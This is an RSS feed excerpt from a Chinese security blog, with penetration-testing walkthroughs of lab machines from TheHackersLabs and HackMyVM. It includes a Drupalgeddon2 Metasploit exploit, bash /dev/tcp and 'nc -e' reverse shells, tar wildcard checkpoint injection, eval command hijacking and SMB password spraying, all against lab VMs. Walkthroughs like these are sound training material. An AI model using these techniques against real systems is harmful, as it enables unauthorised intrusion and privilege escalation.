       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:33:d8:8f brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.118/24 brd 192.168.56.255 scope global dynamic enp0s3
       valid_lft 590sec preferred_lft 590sec
    inet6 fe80::a00:27ff:fe33:d88f/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:58:d5:83:85 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:58ff:fed5:8385/64 scope link 
       valid_lft forever preferred_lft forever
5: veth4a6f795@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
    link/ether 4a:10:44:5c:bf:f6 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::4810:44ff:fe5c:bff6/64 scope link 
       valid_lft forever preferred_lft forever
```

靶机中装了 Docker，但我们没有权限，并且在本地开了一个服务在 `38225` 端口，将其转发出来后没发现什么

枚举一下是否存在其他容器，发现 `172.17.0.2`

```bash
Sophia@TheHackersLabs-PaQueAigaLujo:/$ ping 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.124 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.049 ms
^C
--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1028ms
rtt min/avg/max/mdev = 0.049/0.086/0.124/0.037 ms
```

### 代理搭建

这里使用 stowaway 进行隧道搭建，方便后续操作

```bash
// Kali
./linux_x64_admin -l 8000 -s 123
// Machine
./linux_x64_agent -c 192.168.56.5:8000 -s 123 &
```

![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image3.png)

然后设置 proxy 代理，之后可以通过代理来访问容器

```bash
(admin) >> use 0

(node 0) >> socks 2131
[*] Trying to listen on 0.0.0.0:2131......
[*] Waiting for agent's response......
[*] Socks start successfully!
```

### Drupal 利用

容器运行着 `Drupal`

![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image4.png)

`whatweb` ，站点是 `Drupal8`

```bash
➜  PaQueAigaLujo proxychains whatweb 172.17.0.2
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:2131  ...  172.17.0.2:80  ...  OK
http://172.17.0.2 [200 OK] Apache[2.4.25], Content-Language[en], Country[RESERVED][ZZ], Drupal, HTML5, HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[172.17.0.2], MetaGenerator[Drupal 8 (https://www.drupal.org)], PHP[7.2.3], PoweredBy[-block], Script, Title[Welcome to Find your own Style | Find your own Style], UncommonHeaders[x-drupal-dynamic-cache,x-content-type-options,x-generator,x-drupal-cache], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/7.2.3], X-UA-Compatible[IE=edge]
```

网上搜索 `Drupal8` 存在 RCE 漏洞：**`CVE-2018-7600`**

![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image5.png)

![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image6.png)

存在该漏洞

通过 MSF 进行利用

```bash
➜  PaQueAigaLujo proxychains -q msfconsole  

msf6 > search 2018-7600

Matching Modules
================

   #   Name                                      Disclosure Date  Rank       Check  Description
   -   ----                                      ---------------  ----       -----  -----------
   0   exploit/unix/webapp/drupal_drupalgeddon2  2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection
   1     \_ target: Automatic (PHP In-Memory)    .                .          .      .
   2     \_ target: Automatic (PHP Dropper)      .                .          .      .
   3     \_ target: Automatic (Unix In-Memory)   .                .          .      .
   4     \_ target: Automatic (Linux Dropper)    .                .          .      .
   5     \_ target: Drupal 7.x (PHP In-Memory)   .                .          .      .
   6     \_ target: Drupal 7.x (PHP Dropper)     .                .          .      .
   7     \_ target: Drupal 7.x (Unix In-Memory)  .                .          .      .
   8     \_ target: Drupal 7.x (Linux Dropper)   .                .          .      .
   9     \_ target: Drupal 8.x (PHP In-Memory)   .                .          .      .
   10    \_ target: Drupal 8.x (PHP Dropper)     .                .          .      .
   11    \_ target: Drupal 8.x (Unix In-Memory)  .                .          .      .
   12    \_ target: Drupal 8.x (Linux Dropper)   .                .          .      .
   13    \_ AKA: SA-CORE-2018-002                .                .          .      .
   14    \_ AKA: Drupalgeddon 2                  .                .          .      .
   
msf6 > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp

msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set payload php/reverse_php 
payload => php/reverse_php

msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set lhost 192.168.56.5
lhost => 192.168.56.5

msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set rhosts 172.17.0.2
rhosts => 172.17.0.2
```

成功拿到 `shell`

![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image7.png)

### 获得交互式 shell

存在用户 `ballenita`

```bash
ls /home
ballenita
```

查看数据库配置文件

```bash
cat /var/www/html/sites/default/settings.php
```

![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image8.png)

现在无法进行用户切换，以为现在并不是交互 `shell`，这个会话也无法获得交互 `shell`，要想个办法获得交互的 `shell`

通过 `stowaway` 设置端口转发

![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image9.png)

然后在会话中进行反弹 `shell`

```bash
/bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/6666 0>&1'
```

`Kali` 成功接收到 `Shell` ，该会话可以获得交互式 `shell` ：https://www.sunsetaction.top/2025/04/21/%E5%8F%8D%E5%BC%B9%20shell%20%E5%8D%87%E7%BA%A7/

![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image10.png)

成功切换到用户 `ballenita`

![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image11.png)

### 信息收集 - 2

查看 sudo 权限，可以读取任何文件

```bash
ballenita@76f1a1515e36:/var/www/html$ sudo -l
Matching Defaults entries for ballenita on 76f1a1515e36:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ballenita may run the following commands on 76f1a1515e36:
    (root) NOPASSWD: /bin/ls, /bin/grep
```

`root` 目录下有可疑的文件，文件内容是 `ElcipotedeChocolate-CipotitoCipoton`

![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image12.png)

经过测试，是用户 `cipote` 的密码

![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image13.png)

读取 user.txt

```bash
cipote@TheHackersLabs-PaQueAigaLujo:~$ cat user.txt 
f3xxxxxxxxxxxxxxxxxxxxxxxxxxe8  -
```

## 提权 - root

查看 sudo 权限

```bash
cipote@TheHackersLabs-PaQueAigaLujo:~$ sudo -l
Matching Defaults entries for cipote on TheHackersLabs-PaQueAigaLujo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User cipote may run the following commands on TheHackersLabs-PaQueAigaLujo:
    (ALL) NOPASSWD: /usr/bin/mount
```

结束

![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image14.png)

读取 root.txt

```bash
# cat /root/root.txt
9xxxxxxxxxxxxxxxxxxxxxx  -
```

## 总结

有意思]]></content:encoded>
            <category>靶机</category>
            <category>TheHackersLabs</category>
            <category>Linux</category>
            <category>mount</category>
            <category>Drupal</category>
            <category>Tunnel</category>
        </item>
        <item>
            <title><![CDATA[HackMyVM - Silentdev]]></title>
            <link>https://www.sunsetaction.top/2025/09/26/HackMyVMSilentdev</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/09/26/HackMyVMSilentdev</guid>
            <pubDate>Fri, 26 Sep 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Silentdev. https://hackmyvm.eu/machines/machine.php?vm=Silentdev Recon PortScan FileUpload 直接就是一个文件上传功能 上传一个普通图片后，会给出路径 尝试上传 PHP 后缀文件，没想到直接上传成功了 写一句话木...]]></description>
            <content:encoded><![CDATA[
# Silentdev.

> https://hackmyvm.eu/machines/machine.php?vm=Silentdev
> 

![image.png](/post-images/HackMyVMSilentdev/image.png)

## Recon

### PortScan

```bash
➜  Slientdev nmap -sT -min-rate 10000 -p- 192.168.56.117
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-26 15:42 CST
Nmap scan report for 192.168.56.117
Host is up (0.00055s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:1C:EA:F4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 16.97 seconds
```

```bash

➜  Slientdev nmap -sT -A -p 22,80 192.168.56.117        
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-26 15:42 CST
Nmap scan report for 192.168.56.117
Host is up (0.00054s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey: 
|   256 4a:f7:09:40:45:df:25:cc:a4:f5:85:ac:63:c6:13:3e (ECDSA)
|_  256 58:be:2c:d0:40:af:d5:9c:2a:13:38:82:61:f6:8c:87 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Upload Image
MAC Address: 08:00:27:1C:EA:F4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.54 ms 192.168.56.117

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.16 seconds
```

## FileUpload

直接就是一个文件上传功能

![image.png](/post-images/HackMyVMSilentdev/image1.png)

上传一个普通图片后，会给出路径

![image.png](/post-images/HackMyVMSilentdev/image2.png)

尝试上传 PHP 后缀文件，没想到直接上传成功了

![image.png](/post-images/HackMyVMSilentdev/image3.png)

![image.png](/post-images/HackMyVMSilentdev/image4.png)

写一句话木马，通过蚁剑连接

![image.png](/post-images/HackMyVMSilentdev/image5.png)

弹 `shell`

```bash
nc 192.168.56.5 1234 -e /bin/bash
```

![image.png](/post-images/HackMyVMSilentdev/image6.png)

## 权限提升

### 信息收集

我们能发现 `www-data` 用户拥有 `developers` 组权限

```bash
www-data@silentdev:/var/www/html/uploads$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data),1004(developers)
```

![image.png](/post-images/HackMyVMSilentdev/image7.png)

查询属于该组的文件

```bash
www-data@silentdev:/home$ find / -group developers 2>/dev/null
/opt/project
/var/backups
```

`/opt/project`

```bash
www-data@silentdev:/opt/project$ ls -al
total 12      
drwxrwx--- 2 developer developers 4096 Apr 19 19:30 .
drwxr-xr-x 3 root      root       4096 Apr 19 11:08 ..
-rw-r--r-- 1 root      root       2030 Apr 19 19:29 index.html

www-data@silentdev:/opt/project$ ls
index.html

www-data@silentdev:/opt/project$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

![image.png](/post-images/HackMyVMSilentdev/image8.png)

`/var/backups`

```bash
www-data@silentdev:/var/backups$ ls
apt.extended_states.0  project.tgz
```

解压出来的是和 project 中一模一样的 `index` 文件

不过能看出来系统上有一个定时任务（Cron Job），它会定期将 `/opt/project` 目录的内容打包压缩成 `project.tgz` 文件，并存放到 `/var/backups` 目录中

上传 `pspy` 看一下，果然 `1002` 用户定时会压缩 `/opt/project`

![image.png](/post-images/HackMyVMSilentdev/image9.png)

### tar 利用

`*` 万恶之源

```bash
/bin/sh -c cd /opt/project && tar -zcf /var/backups/project.tgz *
```

hijack：https://gtfobins.github.io/gtfobins/tar/

```bash
cd /opt/project
echo 'nc 192.168.56.5 1235 -e /bin/sh' > shell.sh
chmod +x shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
```

等待弹 shell 即可，即可拿到 `developers` 用户

![image.png](/post-images/HackMyVMSilentdev/image10.png)

### 命令劫持

查看 sudo 权限

```bash
developer@silentdev:~$ sudo -l
Matching Defaults entries for developer on silentdev:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User developer may run the following commands on silentdev:
    (alfonso) NOPASSWD: /usr/bin/sysinfo.sh
```

```bash
developer@silentdev:~$ cat /usr/bin/sysinfo.sh 
#!/bin/bash

echo "Hello $USER, checking system status."

echo "Choose an option:"
echo "1. Disk usage (df)"
echo "2. Running processes (ps)"
echo "3. Exit"

read -p "Enter option (1-3): " opt

case "$opt" in
        1) action="df" ;;
        2) action="ps" ;;
        3) echo "Goodbye!"; exit ;;
        *) action="echo Invalid option" ;;
esac

read -p "Any additional options?: " extra

eval "$action $extra"
```

我 TM 直接劫持

![image.png](/post-images/HackMyVMSilentdev/image11.png)

![image.png](/post-images/HackMyVMSilentdev/image12.png)

读取 `user.txt`

```bash
alfonso@silentdev:~$ cat user.txt 
flag{A89aHFj3830878y3hFJ3h2oH}
```

### xxxx

查看 sudo 权限

```bash
alfonso@silentdev:~$ sudo -l
Matching Defaults entries for alfonso on silentdev:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User alfonso may run the following commands on silentdev:
    (ALL) NOPASSWD: /usr/bin/silentgets
```

```bash
alfonso@silentdev:~$ /usr/bin/silentgets 
Enter the username: root
root:x:0:0:root:/root:/bin/bash
```

拉出来检查一下

![image.png](/post-images/HackMyVMSilentdev/image13.png)

只能说又是命令劫持

![image.png](/post-images/HackMyVMSilentdev/image14.png)

读取 `root.txt`

```bash
root@silentdev:/home/alfonso# cat /root/root.txt 
flag{p7609TNt6a0bGF8HW78BG7eh}
```

## 总结

不如群友 low]]></content:encoded>
            <category>靶机</category>
            <category>HMV</category>
            <category>Linux</category>
            <category>Hijack</category>
            <category>FileUpload</category>
        </item>
        <item>
            <title><![CDATA[TheHackersLabs - Folclore]]></title>
            <link>https://www.sunsetaction.top/2025/09/24/TheHackersLabsFolclore</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/09/24/TheHackersLabsFolclore</guid>
            <pubDate>Wed, 24 Sep 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Folclore https://labs.TheHackersLabs.com/machine/123 Recon PortScan 仅仅两个端口 SMB 枚举 SMB 匿名枚举 但是并不能下载任何东西 但可以注意到描述中有东西 ADMIN$ 远程管理员 C$ 默认资源 亡灵节 最终，我们都会化为...]]></description>
            <content:encoded><![CDATA[
# Folclore

> https://labs.TheHackersLabs.com/machine/123
> 

![image.png](/post-images/TheHackersLabsFolclore/image.png)

## Recon

### PortScan

```bash
➜  Folclore nmap -sn 192.168.56.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 16:14 CST
Nmap scan report for 192.168.56.1
Host is up (0.00045s latency).
MAC Address: 0A:00:27:00:00:08 (Unknown)
Nmap scan report for 192.168.56.2
Host is up (0.00025s latency).
MAC Address: 08:00:27:45:5E:64 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.101
Host is up (0.00037s latency).
MAC Address: 08:00:27:EE:0F:0E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

仅仅两个端口

```bash
➜  Folclore nmap -sT -min-rate 10000 -p- 192.168.56.101
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 16:15 CST
Nmap scan report for 192.168.56.101
Host is up (0.0013s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 08:00:27:EE:0F:0E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 26.54 seconds
```

```bash
➜  Folclore nmap -sT -A -p 139,445 192.168.56.101
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 16:17 CST
Nmap scan report for 192.168.56.101
Host is up (0.00045s latency).

PORT    STATE SERVICE       VERSION
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
MAC Address: 08:00:27:EE:0F:0E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 11
OS CPE: cpe:/o:microsoft:windows_11
OS details: Microsoft Windows 11
Network Distance: 1 hop
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-08-05T08:17:48
|_  start_date: N/A
|_nbstat: NetBIOS name: FOLCLORE, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:ee:0f:0e (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
|_clock-skew: -1s

TRACEROUTE
HOP RTT     ADDRESS
1   0.45 ms 192.168.56.101

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.03 seconds
```

### SMB 枚举

`SMB` 匿名枚举

```bash
➜  Folclore nxc smb 192.168.56.101 -u anonymous -p '' --shares
SMB         192.168.56.101  445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False)
SMB         192.168.56.101  445    FOLCLORE         [+] Folclore\anonymous: (Guest)
SMB         192.168.56.101  445    FOLCLORE         [*] Enumerated shares
SMB         192.168.56.101  445    FOLCLORE         Share           Permissions     Remark
SMB         192.168.56.101  445    FOLCLORE         -----           -----------     ------
SMB         192.168.56.101  445    FOLCLORE         ADMIN$                          Admin remota
SMB         192.168.56.101  445    FOLCLORE         C$                              Recurso predeterminado
SMB         192.168.56.101  445    FOLCLORE         Dia de Muertos                  Al final, todos somos polvo y hueso.
SMB         192.168.56.101  445    FOLCLORE         IPC$            READ            IPC remota
SMB         192.168.56.101  445    FOLCLORE         Libertad                        El secreto está en quien se atreve a buscarlo; sigue tu camino sin miedo.
SMB         192.168.56.101  445    FOLCLORE         Lluvia                          Presta atención, pues en esta imagen el camino se revela sólo a quien sabe escuchar el trueno
SMB         192.168.56.101  445    FOLCLORE         Oro                             ¿Buscas llegar a Quetzalcóatl? Aquí inicia tu camino.
SMB         192.168.56.101  445    FOLCLORE         Santuario                       El Refugio de Ixchel
SMB         192.168.56.101  445    FOLCLORE         Viento                          El viento sagrado ejecutará la tarea a su debido tiempo
```

但是并不能下载任何东西

```bash
➜  Folclore nxc smb 192.168.56.101 -u anonymous -p '' -M spider_plus -o DOWNLOAD_FLAG=true
SMB         192.168.56.101  445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) 
SMB         192.168.56.101  445    FOLCLORE         [+] Folclore\anonymous: (Guest)
SPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*] Started module spidering_plus with the following options:
SPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*]  DOWNLOAD_FLAG: True
SPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*]     STATS_FLAG: True
SPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*]  OUTPUT_FOLDER: /root/.nxc/modules/nxc_spider_plus
SMB         192.168.56.101  445    FOLCLORE         [*] Enumerated shares
SMB         192.168.56.101  445    FOLCLORE         Share           Permissions     Remark
SMB         192.168.56.101  445    FOLCLORE         -----           -----------     ------
SMB         192.168.56.101  445    FOLCLORE         ADMIN$                          Admin remota
SMB         192.168.56.101  445    FOLCLORE         C$                              Recurso predeterminado
SMB         192.168.56.101  445    FOLCLORE         Dia de Muertos                  Al final, todos somos polvo y hueso.
SMB         192.168.56.101  445    FOLCLORE         IPC$            READ            IPC remota
SMB         192.168.56.101  445    FOLCLORE         Libertad                        El secreto está en quien se atreve a buscarlo; sigue tu camino sin miedo.
SMB         192.168.56.101  445    FOLCLORE         Lluvia                          Presta atención, pues en esta imagen el camino se revela sólo a quien sabe escuchar el trueno
SMB         192.168.56.101  445    FOLCLORE         Oro                             ¿Buscas llegar a Quetzalcóatl? Aquí inicia tu camino.
SMB         192.168.56.101  445    FOLCLORE         Santuario                       El Refugio de Ixchel
SMB         192.168.56.101  445    FOLCLORE         Viento                          El viento sagrado ejecutará la tarea a su debido tiempo
SPIDER_PLUS 192.168.56.101  445    FOLCLORE         [+] Saved share-file metadata to "/root/.nxc/modules/nxc_spider_plus/192.168.56.101.json".
SPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*] SMB Shares:           9 (ADMIN$, C$, Dia de Muertos, IPC$, Libertad, Lluvia, Oro, Santuario, Viento)
SPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*] SMB Readable Shares:  1 (IPC$)
SPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*] SMB Filtered Shares:  1
SPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*] Total folders found:  0
SPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*] Total files found:    0
```

但可以注意到描述中有东西

```bash
ADMIN$                          Admin remota
C$                              Recurso predeterminado
Dia de Muertos                  Al final, todos somos polvo y hueso.
IPC$            READ            IPC remota
Libertad                        El secreto está en quien se atreve a buscarlo; sigue tu camino sin miedo.
Lluvia                          Presta atención, pues en esta imagen el camino se revela sólo a quien sabe escuchar el trueno
Oro                             ¿Buscas llegar a Quetzalcóatl? Aquí inicia tu camino.
Santuario                       El Refugio de Ixchel
Viento                          El viento sagrado ejecutará la tarea a su debido tiempo
```

> ADMIN$ - 远程管理员
C$ - 默认资源
亡灵节 - 最终，我们都会化为尘土和白骨。
IPC$ - 读取远程IPC
自由 - 秘密在于那些敢于追寻的人；无所畏惧地追随你的道路。
雨 - 请注意，在这幅图中，只有懂得聆听雷声的人才能找到道路。
金  - 你想到达羽蛇神吗？你的道路从这里开始。
圣所 - 伊克切尔的避难所
风 - 神圣的风会在适当的时候完成任务。
> 

### 用户枚举

用户枚举，PS：之前一直卡在上边，因为没想到要通过暴力破解，因为我觉得会有密码最大阈值（

```bash
➜  Folclore nxc smb 192.168.56.101 -u guest -p '' --rid-brute                      
SMB         192.168.56.101  445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) 
SMB         192.168.56.101  445    FOLCLORE         [+] Folclore\guest: (Guest)
SMB         192.168.56.101  445    FOLCLORE         500: FOLCLORE\Administrador (SidTypeUser)
SMB         192.168.56.101  445    FOLCLORE         501: FOLCLORE\Invitado (SidTypeUser)
SMB         192.168.56.101  445    FOLCLORE         503: FOLCLORE\DefaultAccount (SidTypeUser)
SMB         192.168.56.101  445    FOLCLORE         504: FOLCLORE\WDAGUtilityAccount (SidTypeUser)
SMB         192.168.56.101  445    FOLCLORE         513: FOLCLORE\Ninguno (SidTypeGroup)
SMB         192.168.56.101  445    FOLCLORE         1001: FOLCLORE\Quetzalcoatl (SidTypeUser)
SMB         192.168.56.101  445    FOLCLORE         1003: FOLCLORE\El_charro_negro (SidTypeUser)
SMB         192.168.56.101  445    FOLCLORE         1004: FOLCLORE\Ix_Chel (SidTypeUser)
SMB         192.168.56.101  445    FOLCLORE         1005: FOLCLORE\Tlaloc (SidTypeUser)
SMB         192.168.56.101  445    FOLCLORE         1006: FOLCLORE\La_mulata_de_Cordoba (SidTypeUser)
SMB         192.168.56.101  445    FOLCLORE         1007: FOLCLORE\La_Catrina (SidTypeUser)
```

使用得到的用户名进行密码爆破

```bash
➜  Folclore cat user.txt                                                        
Administrador
Invitado
DefaultAccount
WDAGUtilityAccount
Ninguno
Quetzalcoatl
El_charro_negro
Ix_Chel
Tlaloc
La_mulata_de_Cordoba
La_Catrina
```

经过需求尝试后，发现 `grep '[+]'` 无法匹配出来，因为账户密码过期了.. 需要匹配 `grep -v 'STATUS_LOGON_FAILURE'` 

```bash
➜  Folclore nxc smb 192.168.56.101 -u user.txt -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding --continue-on-success | grep -v 'STATUS_LOGON_FAILURE' 
SMB                      192.168.56.101  445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) 
SMB                      192.168.56.101  445    FOLCLORE         [-] Folclore\El_charro_negro:abc123 STATUS_PASSWORD_EXPIRED
```

为了继续操作，通过图形化界面对密码进行了修改

![image.png](/post-images/TheHackersLabsFolclore/image1.png)

```bash
➜  Folclore nxc smb 192.168.56.101 -u el_charro_negro -p abc1234                                                                                             
SMB         192.168.56.101  445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) 
SMB         192.168.56.101  445    FOLCLORE         [+] Folclore\el_charro_negro:abc1234
```

## 图片隐写 - 1

通过该用户枚举 `SMB`，能得到一张照片

![image.png](/post-images/TheHackersLabsFolclore/image2.png)

![image.png](/post-images/TheHackersLabsFolclore/image3.png)

盲猜是图片隐写了

```bash
➜  Folclore binwalk -Me --run-as=root El_Charro_Negro.jpeg                              

Scan Time:     2025-09-24 17:32:08
Target File:   /root/Desktop/TheHackersLabs/Folclore/El_Charro_Negro.jpeg
MD5 Checksum:  97f1dd191d3d9217ee0147f15a700c4f
Signatures:    436

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------

WARNING: One or more files failed to extract: either no utility was 
found or it's unimplemented

➜  Folclore foremost El_Charro_Negro.jpeg   
Processing: El_Charro_Negro.jpeg
|*|

➜  Folclore exiftool El_Charro_Negro.jpeg 
ExifTool Version Number         : 13.25
File Name                       : El_Charro_Negro.jpeg
Directory                       : .
File Size                       : 50 kB
File Modification Date/Time     : 2025:09:24 17:29:12+08:00
File Access Date/Time           : 2025:09:24 17:30:13+08:00
File Inode Change Date/Time     : 2025:09:24 17:29:12+08:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Big-endian (Motorola, MM)
Y Cb Cr Positioning             : Centered
Copyright                       : El camino es largo pero no complicado. Busca a Ix Chel; ella tiene la siguiente pista aqui tienes la clave: 4+9Ii1wK
Image Width                     : 736
Image Height                    : 981
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 736x981
Megapixels                      : 0.722
```

得到一个提示：

![image.png](/post-images/TheHackersLabsFolclore/image4.png)

给出一个字符串 `4+9Ii1wK` ，估计是个密码

```bash
➜  Folclore nxc smb 192.168.56.101 -u user.txt -p '4+9Ii1wK' --ignore-pw-decoding                                               
SMB         192.168.56.101  445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) 
SMB         192.168.56.101  445    FOLCLORE         [-] Folclore\Quetzalcoatl:4+9Ii1wK STATUS_LOGON_FAILURE 
SMB         192.168.56.101  445    FOLCLORE         [-] Folclore\El_charro_negro:4+9Ii1wK STATUS_LOGON_FAILURE 
SMB         192.168.56.101  445    FOLCLORE         [-] Folclore\Ix_Chel:4+9Ii1wK STATUS_PASSWORD_EXPIRED 
SMB         192.168.56.101  445    FOLCLORE         [-] Folclore\Tlaloc:4+9Ii1wK STATUS_LOGON_FAILURE 
SMB         192.168.56.101  445    FOLCLORE         [-] Folclore\La_mulata_de_Cordoba:4+9Ii1wK STATUS_LOGON_FAILURE 
SMB         192.168.56.101  445    FOLCLORE         [-] Folclore\La_Catrina:4+9Ii1wK STATUS_LOGON_FAILURE
```

是 `Ix_Chel` 的密码，不过也过期了… 重复上边的操作

## 图片隐写 - 2

然后再次枚举 SMB

![image.png](/post-images/TheHackersLabsFolclore/image5.png)

得到一个 TXT 文件，又是一个凭据 `677Kn$q`

```bash
➜  Folclore cat La\ clave\ de\ Kukulcán.txt           
Recuerdo cuando conocí a Kukulcán, 
la serpiente emplumada que otros llaman Quetzalcóatl; 
